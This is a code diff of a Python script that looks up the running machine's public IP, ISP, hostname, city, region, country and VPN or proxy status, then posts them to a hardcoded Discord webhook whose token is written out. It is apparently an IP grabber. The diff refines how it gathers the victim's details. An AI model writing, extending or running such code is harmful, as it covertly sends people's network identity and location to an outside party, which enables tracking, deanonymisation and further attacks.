@@ -1,36 +1,13 @@
 import requests
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1444092786210111632/x8hPF9-vXrKOy_3QJwZKDFvRCsm_7PzVuH69t_rqczttGBoWIXhlexfu9fvxMbrUeijn"
-IPINFO_TOKEN = ""
 
-def get_ipinfo(ip):
-    url = f"https://ipinfo.io/{ip}"
-    if IPINFO_TOKEN:
-        url += f"?token={IPINFO_TOKEN}"
+def get_ipinfo():
     try:
-        resp = requests.get(url, timeout=10)
+        resp = requests.get("http://ip-api.com/json/", timeout=10)
         resp.raise_for_status()
         return resp.json()
     except Exception:
-        return None
-
-def get_ip_privacy(ip):
-    url = f"https://ipinfo.io/{ip}/privacy"
-    if IPINFO_TOKEN:
-        url += f"?token={IPINFO_TOKEN}"
-    try:
-        resp = requests.get(url, timeout=10)
-        resp.raise_for_status()
-        return resp.json()
-    except Exception:
-        return None
-
-def get_public_ip():
-    try:
-        response = requests.get("https://api.ipify.org")
-        response.raise_for_status()
-        return response.text.strip()
-    except requests.RequestException:
         return None
 
 def send_ip_to_discord(message):
@@ -40,20 +17,21 @@ def send_ip_to_discord(message):
         pass
 
 def main():
-    ip = get_public_ip()
-    if not ip:
+    info = get_ipinfo()
+    if not info or info.get("status") != "success":
         return
-    info = get_ipinfo(ip)
-    privacy = get_ip_privacy(ip)
-    org = info.get("org", "Unknown") if info else "Unknown"
-    city = info.get("city", "Unknown") if info else "Unknown"
-    region = info.get("region", "Unknown") if info else "Unknown"
-    country = info.get("country", "Unknown") if info else "Unknown"
-    hostname = info.get("hostname", "Unknown") if info else "Unknown"
-    vpn = privacy.get("vpn", False) if privacy else False
+    ip = info.get("query", "Unknown")
+    org = info.get("org", "Unknown")
+    isp = info.get("isp", "Unknown")
+    hostname = info.get("reverse", "Unknown")
+    city = info.get("city", "Unknown")
+    region = info.get("regionName", "Unknown")
+    country = info.get("country", "Unknown")
+    vpn = info.get("mobile", False) or info.get("proxy", False) or info.get("hosting", False)
     details = [
-        f"User's public IP address: {ip}{' (VPN)' if vpn else ''}",
-        f"ISP: {org}",
+        f"User's public IP address: {ip}{' (VPN/Proxy/Hosting)' if vpn else ''}",
+        f"ISP: {isp}",
+        f"Org: {org}",
         f"Hostname: {hostname}",
         f"Location: {city}, {region}, {country}"
     ]
